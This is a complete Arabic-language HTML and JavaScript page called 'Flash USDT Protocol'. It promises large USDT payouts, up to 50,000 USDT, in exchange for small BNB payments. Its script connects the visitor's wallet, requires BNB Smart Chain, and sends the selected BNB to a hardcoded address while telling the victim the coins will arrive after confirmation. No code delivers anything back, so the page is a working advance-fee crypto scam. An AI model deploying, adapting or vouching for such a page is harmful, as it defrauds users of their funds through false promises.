<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flash USDT Protocol | بروتوكول المكافآت</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #0b0e11; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            min-height: 100vh; margin: 0; padding: 20px;
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { color: #f3ba2f; font-size: 28px; margin: 0; text-shadow: 0 0 10px rgba(243, 186, 47, 0.3); }
        .header p { color: #929aa5; margin-top: 10px; font-size: 15px; }

        .grid { display: grid; grid-template-columns: 1fr; gap: 20px; width: 100%; max-width: 380px; }
        .plan-card { 
            background: #181a20; border: 1px solid #474d57; border-radius: 18px; 
            padding: 25px; text-align: center; transition: 0.3s; cursor: pointer; position: relative;
        }
        .plan-card:hover { border-color: #f3ba2f; transform: translateY(-5px); }
        .vip-card { border: 2px solid #f3ba2f; background: linear-gradient(145deg, #181a20, #1e2329); box-shadow: 0 0 20px rgba(243, 186, 47, 0.2); }
        .badge { background: #f3ba2f; color: black; font-size: 11px; font-weight: bold; padding: 5px 15px; border-radius: 20px; position: absolute; top: -12px; left: 50%; transform: translateX(-50%); }

        .amount-usdt { font-size: 32px; color: #f3ba2f; font-weight: bold; display: block; }
        .cost-bnb { color: #ffffff; font-size: 17px; margin: 12px 0 20px 0; display: block; opacity: 0.9; }
        .btn-pay { background: #f3ba2f; color: black; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 1000; }
        .modal-content { background: #1e2329; margin: 15% auto; padding: 25px; width: 90%; max-width: 350px; border-radius: 20px; border: 1px solid #474d57; }
        .modal-content h3 { margin: 0 0 15px 0; text-align: center; color: #f3ba2f; }
        
        .wallet-option { display: flex; align-items: center; justify-content: space-between; padding: 12px 15px; background: #2b3139; margin: 10px 0; border-radius: 12px; cursor: pointer; border: 1px solid transparent; }
        .wallet-option:hover { border-color: #f3ba2f; background: #323841; }
        .wallet-option img { width: 32px; height: 32px; border-radius: 6px; background: white; }
    </style>
</head>
<body>

    <div class="header">
        <h1>Flash USDT Protocol ⚡</h1>
        <p>اختر حزمتك واستلم USDT فوراً في محفظتك</p>
    </div>

    <div class="grid">
        <div class="plan-card vip-card" onclick="preparePay('1.0')">
            <div class="badge">حزمة الحيتان (VIP)</div>
            <span class="amount-usdt">50,000 USDT</span>
            <span class="cost-bnb">التكلفة: 1.0 BNB</span>
            <button class="btn-pay">تفعيل الحزمة الآن</button>
        </div>

        <div class="plan-card" onclick="preparePay('0.05')">
            <span class="amount-usdt">2,500 USDT</span>
            <span class="cost-bnb">التكلفة: 0.05 BNB</span>
            <button class="btn-pay">اختيار الحزمة</button>
        </div>

        <div class="plan-card" onclick="preparePay('0.012')">
            <span class="amount-usdt">500 USDT</span>
            <span class="cost-bnb">التكلفة: 0.012 BNB</span>
            <button class="btn-pay">اختيار الحزمة</button>
        </div>
    </div>

    <div id="walletModal" class="modal">
        <div class="modal-content">
            <h3>ربط المحفظة الآمن</h3>
            <div class="wallet-option" onclick="connectWallet('metamask')"><span>MetaMask</span><img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"></div>
            <div class="wallet-option" onclick="connectWallet('trust')"><span>Trust Wallet</span><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"></div>
            <div class="wallet-option" onclick="connectWallet('binance')"><span>Binance Wallet</span><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.svg"></div>
            <div class="wallet-option" onclick="connectWallet('wc')"><span>WalletConnect</span><img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg"></div>
            <button onclick="closeModal()" style="background:none; border:none; color:gray; width:100%; cursor:pointer; margin-top:15px;">إلغاء العملية</button>
        </div>
    </div>

    <script>
        const CONTRACT_ADDRESS = "0x7325622388A2967BCaAeE94C986836EB7aB80f4E";
        let selectedAmount = "0";

        function preparePay(amount) {
            selectedAmount = amount;
            document.getElementById("walletModal").style.display = "block";
        }

        function closeModal() { document.getElementById("walletModal").style.display = "none"; }

        async function connectWallet(type) {
            if (window.ethereum) {
                executePay();
            } else {
                // حل مشكلة الهاتف: فتح التطبيق مباشرة
                const dappUrl = window.location.href.split('//')[1];
                if (type === 'metamask') {
                    window.location.href = "https://metamask.app.link/dapp/" + dappUrl;
                } else {
                    alert("يرجى نسخ رابط الموقع وفتحه داخل متصفح محفظة Trust Wallet أو MetaMask");
                }
            }
        }

        async function executePay() {
            try {
                const web3 = new Web3(window.ethereum);
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const chainId = await web3.eth.getChainId();
                
                if (chainId !== 56) {
                    alert("يرجى تحويل الشبكة إلى Smart Chain (BSC)");
                    return;
                }

                const amountWei = web3.utils.toWei(selectedAmount, "ether");
                web3.eth.sendTransaction({
                    from: accounts[0],
                    to: CONTRACT_ADDRESS,
                    value: amountWei
                }).on('transactionHash', h => {
                    alert("تم الإرسال! ستصلك العملات فور تأكيد الشبكة.");
                    closeModal();
                }).on('error', e => alert("خطأ: تأكد من الرصيد والشبكة"));
            } catch (e) { alert("تم رفض العملية"); }
        }

        window.onclick = function(e) { if (e.target == document.getElementById("walletModal")) closeModal(); }
    </script>
</body>
</html>
